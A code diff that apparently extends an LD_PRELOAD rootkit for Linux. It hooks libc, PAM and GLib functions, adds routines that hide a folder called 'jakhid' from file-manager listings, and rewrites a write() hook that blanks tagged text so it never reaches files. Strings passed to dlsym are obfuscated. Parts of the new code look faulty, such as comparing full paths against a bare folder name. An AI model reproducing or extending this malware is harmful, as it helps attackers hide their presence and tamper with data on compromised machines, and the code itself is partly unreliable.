@@ -29,6 +29,7 @@
 #include <sys/syscall.h>
 #include <gio/gio.h>
 #include <glib.h>
+#include <string>
 
 
 static int (*original_getaddrinfo)(const char *node, const char *service, const struct addrinfo *hints, struct addrinfo **res) = NULL;
@@ -51,7 +52,10 @@ static int (*original_pam_get_user)(const pam_handle_t *pamh, const char **user,
 static ssize_t (*original_write)(int fd, const void *buf, size_t count) = NULL;
 static ssize_t (*original_read)(int fd, void *buf, size_t count) = NULL;
 static size_t (*original_fwrite)(const void *ptr, size_t size, size_t nmemb, FILE *stream) = NULL;
-static ssize_t (*original_getdents64)(int fd, void *dirp, size_t count) = NULL;
+static long (*orig_syscall_t)(long, ...) = NULL;
+
+static size_t (*original_fread)(void *ptr, size_t size, size_t nmemb, FILE *stream) = NULL;
+
 
 #define PAM_SUCCESS 0
 
@@ -60,6 +64,33 @@ static ssize_t (*original_getdents64)(int fd, void *dirp, size_t count) = NULL;
 
 #define PAM_RHOST 4
 #define PAM_USER 2
+
+typedef GFileEnumerator* (*g_file_enumerate_children_t) (GFile*, const char*, GFileQueryInfoFlags, GCancellable*, GError**);
+typedef GFileType (*g_file_query_file_type_t) (GFile*, GFileQueryInfoFlags, GCancellable*, GError**);
+
+static const char *HIDDEN_FOLDER = "jakhid";
+
+static g_file_enumerate_children_t real_g_file_enumerate_children;
+static g_file_query_file_type_t real_g_file_query_file_type;
+
+GFileEnumerator* g_file_enumerate_children(GFile *file, const char *attributes, GFileQueryInfoFlags flags, GCancellable *cancellable, GError **error)
+{
+	printf("File :: %s\n", g_file_get_path(file));
+    if(strcmp(g_file_get_path(file), HIDDEN_FOLDER) == 0) {
+        return NULL;
+    }
+    return real_g_file_enumerate_children(file, attributes, flags, cancellable, error);
+}
+
+GFileType g_file_query_file_type(GFile *file, GFileQueryInfoFlags flags, GCancellable *cancellable, GError **error)
+{
+    if(strcmp(g_file_get_path(file), HIDDEN_FOLDER) == 0) {
+        return G_FILE_TYPE_UNKNOWN;
+    }
+    return real_g_file_query_file_type(file, flags, cancellable, error);
+}
+
+
 
 // Hide folders - START
 
@@ -112,6 +143,7 @@ bool is_heap_var(void* pointer){
     return false;
 }
 
+
 // file content tampering
 ssize_t write(int fd, const void *buf, size_t count){
 	char *p1, *p2;
@@ -119,19 +151,29 @@ ssize_t write(int fd, const void *buf, size_t count){
 	if(original_write == NULL){
 		original_write = (ssize_t(*)(int, const void*, size_t))dlsym(RTLD_NEXT, AY_OBFUSCATE("write"));
 	}
-	p1 = strstr((char*)buf, HIDETAG_ENTRY);
-	p2 = strstr((char*)buf, HIDETAG_STOP);
-	if((p1 && p2) && (p2 > p1)){
-		if(!is_heap_var((void*)buf)){
-
-			int start_str = p1 - (char*)buf - 2;
-			int final_str = p2 - (char*)buf + strlen(HIDETAG_STOP) + 2;
-
-			for(i = start_str; i < final_str; i++){
-				((char*)buf)[i] = '\r';
+	std::string str((const char*)buf, count);
+	if(!is_heap_var((void*)buf)){
+		
+		p1 = strstr((char*)buf, HIDETAG_ENTRY);
+		p2 = strstr((char*)buf, HIDETAG_STOP);
+		if((p1 && p2) && (p2 > p1)){
+			int index_start = 0;
+			int index_stop = 0;
+			std::string HIDETAG_ENTRY_STR(HIDETAG_ENTRY);
+			std::string HIDETAG_ENTRY_STOP(HIDETAG_STOP);
+			while (((index_stop = str.find(HIDETAG_ENTRY_STOP, index_stop)) != std::string::npos) || ((index_start = str.find(HIDETAG_ENTRY_STR, index_start)) != std::string::npos)) {
+				index_stop = (str.find(HIDETAG_ENTRY_STOP, index_stop));
+				index_start = (str.find(HIDETAG_ENTRY_STR, index_start));
+				for(int i = index_start; i <= (index_stop + HIDETAG_ENTRY_STOP.size()); ++i){
+					str[i] = '\b';
+				}
+				index_start += HIDETAG_ENTRY_STR.length();
+				index_stop += HIDETAG_ENTRY_STOP.length();
 			}
+			buf = str.c_str();
 		}
-	};
+	}
+
 	ssize_t ret = original_write(fd, buf, count);
 	return ret;
 }
@@ -245,6 +287,8 @@ int getpwnam_r(const char *name, struct passwd *pwd, char *buf, size_t buflen, s
 
 void __attribute__((constructor)) init()
 {
-	setvbuf(stdout, NULL, _IONBF, 0);
+    setvbuf(stdout, NULL, _IONBF, 0);
 	setvbuf(stdin, NULL, _IONBF, 0);
+	real_g_file_enumerate_children = dlsym(RTLD_NEXT, "g_file_enumerate_children");
+    real_g_file_query_file_type = dlsym(RTLD_NEXT, "g_file_query_file_type");
 }
